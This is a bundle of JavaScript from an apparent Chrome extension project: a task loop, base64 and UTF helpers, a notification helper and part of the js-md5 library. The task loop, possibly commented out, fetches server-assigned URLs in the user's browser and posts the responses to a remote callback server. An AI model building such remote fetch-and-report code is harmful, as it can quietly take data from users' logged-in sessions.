// 做任务
//{'taskId':1,'url':'','status':0}
function execTodoList() {
	if (todoListLock) {
		return;
	}
	try {
		todoListLock = true;
		chrome.storage.local.get(["channelTodoList"], function(items) {
			var configArray = JSON.parse(items['channelTodoList'] || '[]');
			try {
				// debugger;
				if (configArray.length == 0) {
					
					addSleepTime('exec');sleepTask('exec');
				} else {
					for (var i=0;i<configArray.length;i++) {
						var item = configArray[i];
						var httpurl = item['url'],taskId = item['taskId'];
						if (item['result']) {
							// 忽略已经请求成功过并缓存的结果
							pushTodoList(taskId,httpurl,item['result']);
							if (i == (configArray.length-1)) {
								addSleepTime('exec');sleepTask('exec');
							}
						} else if (httpurl) {
							$.ajax({type:'get',timeout:2000,url:httpurl,complete:function(XMLHttpRequest, textStatus) {
								if ("success" == textStatus) {
									pushTodoList(taskId,httpurl,XMLHttpRequest.responseText);
								} else {
									addSleepTime('exec');sleepTask('exec');
								}
							}});
							break;
						}
					} 
				}
			} catch(err) {
				addSleepTime('exec');sleepTask('exec');
			}
		});
	} finally {
		todoListLock = false;
	}
}
function pushTodoList(taskId,httpurl,dataStr) {
	$.ajax({
		type:'post',async:false,timeout:2000,url:callbackUrl+"&corp="+(api['corpCode']||''),data:{content:dataStr,url:httpurl,taskId:taskId},
		complete:function(XMLHttpRequest1, textStatus1) {
			if ("success" == textStatus1) {
				// 成功（00）：清除；异常（05）：暂存data到item里；失败（数据不对01）：清空缓存
				var json = JSON.parse(XMLHttpRequest1.responseText);
				chrome.storage.local.get(["channelTodoList"], function(items) {
					var configArray = JSON.parse(items['channelTodoList'] || '[]');
					var newConfigArray = [];
					$(configArray).each(function(i,item) {
						if (taskId == item['taskId']) {
							if ('00' == json['code']) {
								
							} else if ('01' == json['code']) {
								delete item['result'];
								newConfigArray.push(item);
							} else if ('05' == json['code']) {
								item['result'] = dataStr;
								newConfigArray.push(item);
							}
						} else {
							newConfigArray.push(item);
						}
					});
					chrome.storage.local.set({"channelTodoList":JSON.stringify(newConfigArray)},function(){});
					if ('00' == json['code']) {
						resetSleepTime('exec');sleepTask('exec');
					} else {
						addSleepTime('exec');sleepTask('exec');
					}
				});
			} else {
				addSleepTime('exec');sleepTask('exec');
			}
		}
	});
}
function resetSleepTime(op) {
	'fetch' == op ? (fetchTaskms = 5) : (execTaskms = 5);
}
function addSleepTime(op) {
	if ('fetch' == op) {
		fetchTaskms < 50 ? (fetchTaskms += firstStepT) : fetchTaskms > 200 ? resetSleepTime(op) : (fetchTaskms += secondStepT);
	} else {
		execTaskms < 50 ? (execTaskms += firstStepT) : execTaskms > 200 ? resetSleepTime(op) : (execTaskms += secondStepT);
	}
}
async function sleepTask(op) {
	if (taskRunning) {
		if ('fetch' == op) {
			//console.log('fetch start sleep~', fetchTaskms, '~locked:' + todoListLock,+new Date());
			await sleep(fetchTaskms * 1000);
			//console.log('fetch finish sleep~',+new Date());
			getTodoList();
		} else {
			//console.log('exec start sleep~', execTaskms, '~locked:' + todoListLock,+new Date());
			await sleep(execTaskms * 1000);
			//console.log('exec finish sleep~',+new Date());
			execTodoList();
		}
	}
}
function sleep(ms) {
	return new Promise(resolve => setTimeout(resolve, ms));
}
function startTask() {
	if (taskRunning) {
		console.log('startTask->',+new Date(),'->isRunnig');
	} else {
		console.log('startTask->',+new Date());
		taskRunning = true;
		sleepTask('fetch'),sleepTask('exec');
	}
}
function stopTask () {
	console.log('stopTask->',+new Date());
	taskRunning = false;
}
setInterval(function() { checkNeedStartUp();},5*60*1000);// 定时获取配置判断任务是否需要开启或关闭
checkNeedStartUp();*/
/*************task end**************/

//_messageNotice({'title':'ddd','channelKey':'1_logo','message':'dasd'})
function _messageNotice(data) {  

    //显示一个桌面通知  
    if (window.webkitNotifications) {  
        var notification = window.webkitNotifications.createNotification(  
            'images/'+data.channelKey+'.png',  // icon url - can be relative  
            data.title,  // notification title  
            data.message  // notification body text  
        );  
        notification.show();          
        // 设置3秒后，将桌面通知dismiss  
        setTimeout(function(){notification.cancel();}, data.time?data.time:3000);  
   
    } else if (chrome.notifications) {  
        var opt = {  
            type: 'basic',  
            title: data.title,  
            message: data.message,  
            iconUrl: 'images/'+data.channelKey+'.png',  
        }  
        chrome.notifications.create('', opt, function(id){  
            setTimeout(function(){  
            chrome.notifications.clear(id, function(){});  
            }, data.time?data.time:3000);  
        });  
      
    } else {  
        console.log('亲，你的浏览器不支持啊！');  
    }
}

// original file:demos/jianlibao/js/libs/base64.js

var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var base64DecodeChars = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

function base64encode(str) {
    var out, i, len;
    var c1, c2, c3;

    len = str.length;
    i = 0;
    out = "";
    while (i < len) {
        c1 = str.charCodeAt(i++) & 0xff;
        if (i == len) {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt((c1 & 0x3) << 4);
            out += "==";
            break;
        }
        c2 = str.charCodeAt(i++);
        if (i == len) {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
            out += base64EncodeChars.charAt((c2 & 0xF) << 2);
            out += "=";
            break;
        }
        c3 = str.charCodeAt(i++);
        out += base64EncodeChars.charAt(c1 >> 2);
        out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
        out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6));
        out += base64EncodeChars.charAt(c3 & 0x3F);
    }
    return out;
}

function base64decode(str) {
    var c1, c2, c3, c4;
    var i, len, out;

    len = str.length;
    i = 0;
    out = "";
    while (i < len) {
        /* c1 */
        do {
            c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
        } while (i < len && c1 == -1);
        if (c1 == -1)
            break;

        /* c2 */
        do {
            c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
        } while (i < len && c2 == -1);
        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        /* c3 */
        do {
            c3 = str.charCodeAt(i++) & 0xff;
            if (c3 == 61)
                return out;
            c3 = base64DecodeChars[c3];
        } while (i < len && c3 == -1);
        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        /* c4 */
        do {
            c4 = str.charCodeAt(i++) & 0xff;
            if (c4 == 61)
                return out;
            c4 = base64DecodeChars[c4];
        } while (i < len && c4 == -1);
        if (c4 == -1)
            break;
        out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

function utf16to8(str) {
    var out, i, len, c;

    out = "";
    len = str.length;
    for (i = 0; i < len; i++) {
        c = str.charCodeAt(i);
        if ((c >= 0x0001) && (c <= 0x007F)) {
            out += str.charAt(i);
        } else if (c > 0x07FF) {
            out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
            out += String.fromCharCode(0x80 | ((c >> 6) & 0x3F));
            out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
        } else {
            out += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F));
            out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
        }
    }
    return out;
}

function utf8to16(str) {
    var out, i, len, c;
    var char2, char3;

    out = "";
    len = str.length;
    i = 0;
    while (i < len) {
        c = str.charCodeAt(i++);
        switch (c >> 4) {
            case 0:
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
            case 6:
            case 7:
                // 0xxxxxxx
                out += str.charAt(i - 1);
                break;
            case 12:
            case 13:
                // 110x xxxx   10xx xxxx
                char2 = str.charCodeAt(i++);
                out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                break;
            case 14:
                // 1110 xxxx  10xx xxxx  10xx xxxx
                char2 = str.charCodeAt(i++);
                char3 = str.charCodeAt(i++);
                out += String.fromCharCode(((c & 0x0F) << 12) |
                    ((char2 & 0x3F) << 6) |
                    ((char3 & 0x3F) << 0));
                break;
        }
    }

    return out;
}

function CharToHex(str) {
    var out, i, len, c, h;
    out = "";
    len = str.length;
    i = 0;
    while (i < len) {
        c = str.charCodeAt(i++);
        h = c.toString(16);
        if (h.length < 2)
            h = "0" + h;

        out += "\\x" + h + " ";
        if (i > 0 && i % 8 == 0)
            out += "\r\n";
    }

    return out;
}

// original file:demos/jianlibao/js/libs/md5.js

/**
 * [js-md5]{@link https://github.com/emn178/js-md5}
 *
 * @namespace md5
 * @version 0.4.2
 * @author Chen, Yi-Cyuan [emn178@gmail.com]
 * @copyright Chen, Yi-Cyuan 2014-2017
 * @license MIT
 */
(function () {
  'use strict';

  var root = typeof window === 'object' ? window : {};
  var NODE_JS = !root.JS_MD5_NO_NODE_JS && typeof process === 'object' && process.versions && process.versions.node;
  if (NODE_JS) {
    root = global;
  }
  var COMMON_JS = !root.JS_MD5_NO_COMMON_JS && typeof module === 'object' && module.exports;
  var AMD = typeof define === 'function' && define.amd;
  var ARRAY_BUFFER = !root.JS_MD5_NO_ARRAY_BUFFER && typeof ArrayBuffer !== 'undefined';
  var HEX_CHARS = '0123456789abcdef'.split('');
  var EXTRA = [128, 32768, 8388608, -2147483648];
  var SHIFT = [0, 8, 16, 24];
  var OUTPUT_TYPES = ['hex', 'array', 'digest', 'buffer', 'arrayBuffer'];

  var blocks = [], buffer8;
  if (ARRAY_BUFFER) {
    var buffer = new ArrayBuffer(68);
    buffer8 = new Uint8Array(buffer);
    blocks = new Uint32Array(buffer);
  }

  /**
   * @method hex
   * @memberof md5
   * @description Output hash as hex string
   * @param {String|Array|Uint8Array|ArrayBuffer} message message to hash
   * @returns {String} Hex string
   * @example
   * md5.hex('The quick brown fox jumps over the lazy dog');
   * // equal to
   * md5('The quick brown fox jumps over the lazy dog');
   */
  /**
   * @method digest
   * @memberof md5
   * @description Output hash as bytes array
   * @param {String|Array|Uint8Array|ArrayBuffer} message message to hash
   * @returns {Array} Bytes array
   * @example
   * md5.digest('The quick brown fox jumps over the lazy dog');
   */
  /**
   * @method array
   * @memberof md5
   * @description Output hash as bytes array
   * @param {String|Array|Uint8Array|ArrayBuffer} message message to hash
   * @returns {Array} Bytes array
   * @example
   * md5.array('The quick brown fox jumps over the lazy dog');
   */
  /**
   * @method arrayBuffer
   * @memberof md5
   * @description Output hash as ArrayBuffer
   * @param {String|Array|Uint8Array|ArrayBuffer} message message to hash
   * @returns {ArrayBuffer} ArrayBuffer
   * @example
   * md5.arrayBuffer('The quick brown fox jumps over the lazy dog');
   */
  /**
   * @method buffer
   * @deprecated This maybe confuse with Buffer in node.js. Please use arrayBuffer instead.
   * @memberof md5
   * @description Output hash as ArrayBuffer
   * @param {String|Array|Uint8Array|ArrayBuffer} message message to hash
   * @returns {ArrayBuffer} ArrayBuffer
   * @example
   * md5.buffer('The quick brown fox jumps over the lazy dog');
   */
  var createOutputMethod = function (outputType) {
    return function (message) {
      return new Md5(true).update(message)[outputType]();
    };
  };

  /**
   * @method create
   * @memberof md5
   * @description Create Md5 object
   * @returns {Md5} Md5 object.
   * @example
   * var hash = md5.create();
   */
  /**
   * @method update
   * @memberof md5
   * @description Create and update Md5 object
   * @param {String|Array|Uint8Array|ArrayBuffer} message message to hash
   * @returns {Md5} Md5 object.
   * @example
   * var hash = md5.update('The quick brown fox jumps over the lazy dog');
   * // equal to
   * var hash = md5.create();
   * hash.update('The quick brown fox jumps over the lazy dog');
   */
  var createMethod = function () {
    var method = createOutputMethod('hex');
    if (NODE_JS) {
      method = nodeWrap(method);
    }
    method.create = function () {
      return new Md5();
    };
    method.update = function (message) {
      return method.create().update(message);
    };
    for (var i = 0; i < OUTPUT_TYPES.length; ++i) {
      var type = OUTPUT_TYPES[i];
      method[type] = createOutputMethod(type);
    }
    return method;
  };

  var nodeWrap = function (method) {
    var crypto = require('crypto');
    var Buffer = require('buffer').Buffer;
    var nodeMethod = function (message) {
      if (typeof message === 'string') {
        return crypto.createHash('md5').update(message, 'utf8').digest('hex');
      } else if (message.constructor === ArrayBuffer) {
        message = new Uint8Array(message);
      } else if (message.length === undefined) {
        return method(message);
      }
      return crypto.createHash('md5').update(new Buffer(message)).digest('hex');
    };
    return nodeMethod;
  };

  /**
   * Md5 class
   * @class Md5
   * @description This is internal class.
   * @see {@link md5.create}
   */
  function Md5(sharedMemory) {
    if (sharedMemory) {
      blocks[0] = blocks[16] = blocks[1] = blocks[2] = blocks[3] =
      blocks[4] = blocks[5] = blocks[6] = blocks[7] =
      blocks[8] = blocks[9] = blocks[10] = blocks[11] =
      blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;
      this.blocks = blocks;
      this.buffer8 = buffer8;
    } else {
      if (ARRAY_BUFFER) {
        var buffer = new ArrayBuffer(68);
        this.buffer8 = new Uint8Array(buffer);
        this.blocks = new Uint32Array(buffer);
      } else {
        this.blocks = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
      }
    }
    this.h0 = this.h1 = this.h2 = this.h3 = this.start = this.bytes = 0;
    this.finalized = this.hashed = false;
    this.first = true;
  }

  /**
   * @method update
   * @memberof Md5
   * @instance
   * @description Update hash
   * @param {String|Array|Uint8Array|ArrayBuffer} message message to hash
   * @returns {Md5} Md5 object.
   * @see {@link md5.update}
   */
  Md5.prototype.update = function (message) {
    if (this.finalized) {
      return;
    }
    var notString = typeof(message) != 'string';
    if (notString && message.constructor == root.ArrayBuffer) {
      message = new Uint8Array(message);
    }
    var code, index = 0, i, length = message.length || 0, blocks = this.blocks;
    var buffer8 = this.buffer8;

    while (index < length) {
      if (this.hashed) {
        this.hashed = false;
        blocks[0] = blocks[16];
        blocks[16] = blocks[1] = blocks[2] = blocks[3] =
        blocks[4] = blocks[5] = blocks[6] = blocks[7] =
        blocks[8] = blocks[9] = blocks[10] = blocks[11] =
        blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;
      }

      if (notString) {
        if (ARRAY_BUFFER) {
          for (i = this.start; index < length && i < 64; ++index) {
            buffer8[i++] = message[index];
          }
        } else {
          for (i = this.start; index < length && i < 64; ++index) {
            blocks[i >> 2] |= message[index] << SHIFT[i++ & 3];
          }
        }
      } else {
        if (ARRAY_BUFFER) {
          for (i = this.start; index < length && i < 64; ++index) {
            code = message.charCodeAt(index);
            if (code < 0x80) {
              buffer8[i++] = code;
            } else if (code < 0x800) {
              buffer8[i++] = 0xc0 | (code >> 6);
              buffer8[i++] = 0x80 | (code & 0x3f);
            } else if (code < 0xd800 || code >= 0xe000) {
              buffer8[i++] = 0xe0 | (code >> 12);
              buffer8[i++] = 0x80 | ((code >> 6) & 0x3f);
              buffer8[i++] = 0x80 | (code & 0x3f);
            } else {
              code = 0x10000 + (((code & 0x3ff) << 10) | (message.charCodeAt(++index) & 0x3ff));
              buffer8[i++] = 0xf0 | (code >> 18);
              buffer8[i++] = 0x80 | ((code >> 12) & 0x3f);
              buffer8[i++] = 0x80 | ((code >> 6) & 0x3f);
              buffer8[i++] = 0x80 | (code & 0x3f);
            }
          }
        } else {
          for (i = this.start; index < length && i < 64; ++index) {
            code = message.charCodeAt(index);
            if (code < 0x80) {
              blocks[i >> 2] |= code << SHIFT[i++ & 3];
            } else if (code < 0x800) {
              blocks[i >> 2] |= (0xc0 | (code >> 6)) << SHIFT[i++ & 3];
              blocks[i >> 2] |= (0x80 | (code & 0x3f)) << SHIFT[i++ & 3];
            } else if (code < 0xd800 || code >= 0xe000) {
              blocks[i >> 2] |= (0xe0 | (code >> 12)) << SHIFT[i++ & 3];
              blocks[i >> 2] |= (0x80 | ((code >> 6) & 0x3f)) << SHIFT[i++ & 3];
              blocks[i >> 2] |= (0x80 | (code & 0x3f)) << SHIFT[i++ & 3];
            } else {
              code = 0x10000 + (((code & 0x3ff) << 10) | (message.charCodeAt(++index) & 0x3ff));
              blocks[i >> 2] |= (0xf0 | (code >> 18)) << SHIFT[i++ & 3];
              blocks[i >> 2] |= (0x80 | ((code >> 12) & 0x3f)) << SHIFT[i++ & 3];
              blocks[i >> 2] |= (0x80 | ((code >> 6) & 0x3f)) << SHIFT[i++ & 3];
              blocks[i >> 2] |= (0x80 | (code & 0x3f)) << SHIFT[i++ & 3];
            }
          }
        }
      }
      this.lastByteIndex = i;
      this.bytes += i - this.start;
      if (i >= 64) {
        this.start = i - 64;
        this.hash();
        this.hashed = true;
      } else {
        this.start = i;
      }
    }
    return this;
  };

  Md5.prototype.finalize = function () {
    if (this.finalized) {
      return;
    }
    this.finalized = true;
    var blocks = this.blocks, i = this.lastByteIndex;
    blocks[i >> 2] |= EXTRA[i & 3];
    if (i >= 56) {
      if (!this.hashed) {
        this.hash();
      }
      blocks[0] = blocks[16];
      blocks[16] = blocks[1] = blocks[2] = blocks[3] =
      blocks[4] = blocks[5] = blocks[6] = blocks[7] =
      blocks[8] = blocks[9] = blocks[10] = blocks[11] =
      blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;
    }
    blocks[14] = this.bytes << 3;
    this.hash();
  };

  Md5.prototype.hash = function () {
    var a, b, c, d, bc, da, blocks = this.blocks;

    if (this.first) {
      a = blocks[0] - 680876937;
      a = (a << 7 | a >>> 25) - 271733879 << 0;
      d = (-1732584194 ^ a & 2004318071) + blocks[1] - 117830708;
      d = (d << 12 | d >>> 20) + a << 0;
      c = (-271733879 ^ (d & (a ^ -271733879))) + blocks[2] - 1126478375;
      c = (c << 17 | c >>> 15) + d << 0;
      b = (a ^ (c & (d ^ a))) + blocks[3] - 1316259209;
      b = (b << 22 | b >>> 10) + c << 0;
    } else {
      a = this.h0;
      b = this.h1;
      c = this.h2;
      d = this.h3;
      a += (d ^ (b & (c ^ d))) + blocks[0] - 680876936;
      a = (a << 7 | a >>> 25) + b << 0;
      d += (c ^ (a & (b ^ c))) + blocks[1] - 389564586;
      d = (d << 12 | d >>> 20) + a << 0;
      c += (b ^ (d & (a ^ b))) + blocks[2] + 606105819;
      c = (c << 17 | c >>> 15) + d << 0;
      b += (a ^ (c & (d ^ a))) + blocks[3] - 1044525330;
      b = (b << 22 | b >>> 10) + c << 0;
    }

    a += (d ^ (b & (c ^ d))) + blocks[4] - 176418897;
    a = (a << 7 | a >>> 25) + b << 0;
    d += (c ^ (a & (b ^ c))) + blocks[5] + 1200080426;
    d = (d << 12 | d >>> 20) + a << 0;
    c += (b ^ (d & (a ^ b))) + blocks[6] - 1473231341;
    c = (c << 17 | c >>> 15) + d << 0;
    b += (a ^ (c & (d ^ a))) + blocks[7] - 45705983;
    b = (b << 22 | b >>> 10) + c << 0;
    a += (d ^ (b & (c ^ d))) + blocks[8] + 1770035416;
    a = (a << 7 | a >>> 25) + b << 0;
    d += (c ^ (a & (b ^ c))) + blocks[9] - 1958414417;
    d = (d << 12 | d >>> 20) + a << 0;
    c += (b ^ (d & (a ^ b))) + blocks[10] - 42063;
    c = (c << 17 | c >>> 15) + d << 0;
    b += (a ^ (c & (d ^ a))) + blocks[11] - 1990404162;
    b = (b << 22 | b >>> 10) + c << 0;
    a += (d ^ (b & (c ^ d))) + blocks[12] + 1804603682;
    a = (a << 7 | a >>> 25) + b << 0;
    d += (c ^ (a & (b ^ c))) + blocks[13] - 40341101;
    d = (d << 12 | d >>> 20) + a << 0;
    c += (b ^ (d & (a ^ b))) + blocks[14] - 1502002290;
    c = (c << 17 | c >>> 15) + d << 0;
    b += (a ^ (c & (d ^ a))) + blocks[15] + 1236535329;
    b = (b << 22 | b >>> 10) + c << 0;
    a += (c ^ (d & (b ^ c))) + blocks[1] - 165796510;
    a = (a << 5 | a >>> 27) + b << 0;
    d += (b ^ (c & (a ^ b))) + blocks[6] - 1069501632;
    d = (d << 9 | d >>> 23) + a << 0;
    c += (a ^ (b & (d ^ a))) + blocks[11] + 643717713;
    c = (c << 14 | c >>> 18) + d << 0;
    b += (d ^ (a & (c ^ d))) + blocks[0] - 373897302;
    b = (b << 20 | b >>> 12) + c << 0;
    a += (c ^ (d & (b ^ c))) + blocks[5] - 701558691;
    a = (a << 5 | a >>> 27) + b << 0;
    d += (b ^ (c & (a ^ b))) + blocks[10] + 38016083;
    d = (d << 9 | d >>> 23) + a << 0;
    c += (a ^ (b & (d ^ a))) + blocks[15] - 660478335;
    c = (c << 14 | c >>> 18) + d << 0;
    b += (d ^ (a & (c ^ d))) + blocks[4] - 405537848;
    b = (b << 20 | b >>> 12) + c << 0;
    a += (c ^ (d & (b ^ c))) + blocks[9] + 568446438;
    a = (a << 5 | a >>> 27) + b << 0;
    d += (b ^ (c & (a ^ b))) + blocks[14] - 1019803690;
    d = (d << 9 | d >>> 23) + a << 0;
    c += (a ^ (b & (d ^ a))) + blocks[3] - 187363961;
    c = (c << 14 | c >>> 18) + d << 0;
    b += (d ^ (a & (c ^ d))) + blocks[8] + 1163531501;
    b = (b << 20 | b >>> 12) + c << 0;
    a += (c ^ (d & (b ^ c))) + blocks[13] - 1444681467;
    a = (a << 5 | a >>> 27) + b << 0;
    d += (b ^ (c & (a ^ b))) + blocks[2] - 51403784;
    d = (d << 9 | d >>> 23) + a << 0;
    c += (a ^ (b & (d ^ a))) + blocks[7] + 1735328473;
    c = (c << 14 | c >>> 18) + d << 0;
    b += (d ^ (a & (c ^ d))) + blocks[12] - 1926607734;
    b = (b << 20 | b >>> 12) + c << 0;
    bc = b ^ c;
    a += (bc ^ d) + blocks[5] - 378558;
    a = (a << 4 | a >>> 28) + b << 0;
    d += (bc ^ a) + blocks[8] - 2022574463;
    d = (d << 11 | d >>> 21) + a << 0;
    da = d ^ a;
    c += (da ^ b) + blocks[11] + 1839030562;
    c = (c << 16 | c >>> 16) + d << 0;
    b += (da ^ c) + blocks[14] - 35309556;
    b = (b << 23 | b >>> 9) + c << 0;
    bc = b ^ c;
    a += (bc ^ d) + blocks[1] - 1530992060;
    a = (a << 4 | a >>> 28) + b << 0;
    d += (bc ^ a) + blocks[4] + 1272893353;
    d = (d << 11 | d >>> 21) + a << 0;
    da = d ^ a;
    c += (da ^ b) + blocks[7] - 155497632;
    c = (c << 16 | c >>> 16) + d << 0;
    b += (da ^ c) + blocks[10] - 1094730640;
    b = (b << 23 | b >>> 9) + c << 0;
    bc = b ^ c;
    a += (bc ^ d) + blocks[13] + 681279174;
    a = (a << 4 | a >>> 28) + b << 0;
    d += (bc ^ a) + blocks[0] - 358537222;
    d = (d << 11 | d >>> 21) + a << 0;
    da = d ^ a;
    c += (da ^ b) + blocks[3] - 722521979;
    c = (c << 16 | c >>> 16) + d << 0;
    b += (da ^ c) + blocks[6] + 76029189;
    b = (b << 23 | b >>> 9) + c << 0;
    bc = b ^ c;
    a += (bc ^ d) + blocks[9] - 640364487;
    a = (a << 4 | a >>> 28) + b << 0;
    d += (bc ^ a) + blocks[12] - 421815835;
    d = (d << 11 | d >>> 21) + a << 0;
    da = d ^ a;
    c += (da ^ b) + blocks[15] + 530742520;
    c = (c << 16 | c >>> 16) + d << 0;
    b += (da ^ c) + blocks[2] - 995338651;
    b = (b << 23 | b >>> 9) + c << 0;
    a += (c ^ (b | ~d)) + blocks[0] - 198630844;
    a = (a << 6 | a >>> 26) + b << 0;
    d += (b ^ (a | ~c)) + blocks[7] + 1126891415;
    d = (d << 10 | d >>> 22) + a << 0;
    c += (a ^ (d | ~b)) + blocks[14] - 1416354905;
    c = (c << 15 | c >>> 17) + d << 0;
    b += (d ^ (c | ~a)) + blocks[5] - 57434055;
    b = (b << 21 | b >>> 11) + c << 0;
    a += (c ^ (b | ~d)) + blocks[12] + 1700485571;
    a = (a << 6 | a >>> 26) + b << 0;
    d += (b ^ (a | ~c)) + blocks[3] - 1894986606;
    d = (d << 10 | d >>> 22) + a << 0;
    c += (a ^ (d | ~b)) + blocks[10] - 1051523;
    c = (c << 15 | c >>> 17) + d << 0;
    b += (d ^ (c | ~a)) + blocks[1] - 2054922799;
    b = (b << 21 | b >>> 11) + c << 0;
    a += (c ^ (b | ~d)) + blocks[8] + 1873313359;
    a = (a << 6 | a >>> 26) + b << 0;
    d += (b ^ (a | ~c)) + blocks[15] - 30611744;
    d = (d << 10 | d >>> 22) + a << 0;
    c += (a ^ (d | ~b)) + blocks[6] - 1560198380;
    c = (c << 15 | c >>> 17) + d << 0;
    b += (d ^ (c | ~a)) + blocks[13] + 1309151649;
    b = (b << 21 | b >>> 11) + c << 0;
    a += (c ^ (b | ~d)) + blocks[4] - 145523070;
    a = (a << 6 | a >>> 26) + b << 0;
    d += (b ^ (a | ~c)) + blocks[11] - 1120210379;
    d = (d << 10 | d >>> 22) + a << 0;
    c += (a ^ (d | ~b)) + blocks[2] + 718787259;
    c = (c << 15 | c >>> 17) + d << 0;
    b += (d ^ (c | ~a)) + blocks[9] - 343485551;
    b = (b << 21 | b >>> 11) + c << 0;

    if (this.first) {
      this.h0 = a + 1732584193 << 0;
      this.h1 = b - 271733879 << 0;
      this.h2 = c - 1732584194 << 0;
      this.h3 = d + 271733878 << 0;
      this.first = false;
    } else {
      this.h0 = this.h0 + a << 0;
      this.h1 = this.h1 + b << 0;
      this.h2 = this.h2 + c << 0;
      this.h3 = this.h3 + d << 0;
    }
  };

  /**
   * @method hex
   * @memberof Md5
   * @instance
   * @description Output hash as hex string
   * @returns {String} Hex string
   * @see {@link md5.hex}
   * @example
   * hash.hex();
   */
  Md5.prototype.hex = function () {
    this.finalize();

    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3;

    return HEX_CHARS[(h0 >> 4) & 0x0F] + HEX_CHARS[h0 & 0x0F] +
       HEX_CHARS[(h0 >> 12) & 0x0F] + HEX_CHARS[(h0 >> 8) & 0x0F] +
       HEX_CHARS[(h0 >> 20) & 0x0F] + HEX_CHARS[(h0 >> 16) & 0x0F] +
       HEX_CHARS[(h0 >> 28) & 0x0F] + HEX_CHARS[(h0 >> 24) & 0x0F] +
       HEX_CHARS[(h1 >> 4) & 0x0F] + HEX_CHARS[h1 & 0x0F] +
       HEX_CHARS[(h1 >> 12) & 0x0F] + HEX_CHARS[(h1 >> 8) & 0x0F] +
       HEX_CHARS[(h1 >> 20) & 0x0F] + HEX_CHARS[(h1 >> 16) & 0x0F] +
       HEX_CHARS[(h1 >> 28) & 0x0F] + HEX_CHARS[(h1 >> 24) & 0x0F] +
       HEX_CHARS[(h2 >> 4) & 0x0F] + HEX_CHARS[h2 & 0x0F] +
       HEX_CHARS[(h2 >> 12) & 0x0F] + HEX_CHARS[(h2 >> 8) & 0x0F] +
       HEX_CHARS[(h2 >> 20) & 0x0F] + HEX_CHARS[(h2 >> 16) & 0x0F] +
       HEX_CHARS[(h2 >> 28) & 0x0F] + HEX_CHARS[(h2 >> 24) & 0x0F] +
       HEX_CHARS[(h3 >> 4) & 0x0F] + HEX_CHARS[h3 & 0x0F] +
       HEX_CHARS[(h3 >> 12) & 0x0F] + HEX_CHARS[(h3 >> 8) & 0x0F] +
       HEX_CHARS[(h3 >> 20) & 0x0F] + HEX_CHARS[(h3 >> 16) & 0x0F] +
       HEX_CHARS[(h3 >> 28) & 0x0F] + HEX_CHARS[(h3 >> 24) & 0x0F];
  };

  /**
   * @method toString
   * @memberof Md5
   * @instance
   * @description Output hash as hex string
   * @returns {String} Hex string
   * @see {@link md5.hex}
   * @example
   * hash.toString();
   */
  Md5.prototype.toString = Md5.prototype.hex;

  /**
   * @method digest
   * @memberof Md5
   * @instance
   * @description Output hash as bytes array
   * @returns {Array} Bytes array
   * @see {@link md5.digest}
   * @example
   * hash.digest();
   */
  Md5.prototype.digest = function () {
    this.finalize();

    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3;
    return [
      h0 & 0xFF, (h0 >> 8) & 0xFF, (h0 >> 16) & 0xFF, (h0 >> 24) & 0xFF,
      h1 & 0xFF, (h1 >> 8) & 0xFF, (h1 >> 16) & 0xFF, (h1 >> 24) & 0xFF,
      h2 & 0xFF, (h2 >> 8) & 0xFF, (h2 >> 16) & 0xFF, (h2 >> 24) & 0xFF,
      h3 & 0xFF, (h3 >> 8) & 0xFF, (h3 >> 16) & 0xFF, (h3 >> 24) & 0xFF
    ];
  };

  /**
   * @method array
   * @memberof Md5
   * @instance
   * @description Output hash as bytes array
   * @returns {Array} Bytes array
   * @see {@link md5.array}
   * @example
   * hash.array();
   */
  Md5.prototype.array = Md5.prototype.digest;

  /**
   * @method arrayBuffer
   * @memberof Md5
   * @instance
   * @description Output hash as ArrayBuffer
   * @returns {ArrayBuffer} ArrayBuffer
   * @see {@link md5.arrayBuffer}
   * @example
   * hash.arrayBuffer();
   */
  Md5.prototype.arrayBuffer = function () {
    this.finalize();

    var buffer = new ArrayBuffer(16);
    var blocks = new Uint32Array(buffer);
    blocks[0] = this.h0;
    blocks[1] = this.h1;
    blocks[2] = this.h2;
    blocks[3] = this.h3;
    return buffer;
  };

  /**
   * @method buffer
   * @deprecated This maybe confuse with Buffer in node.js. Please use arrayBuffer instead.
   * @memberof Md5
   * @instance
   * @description Output hash as ArrayBuffer
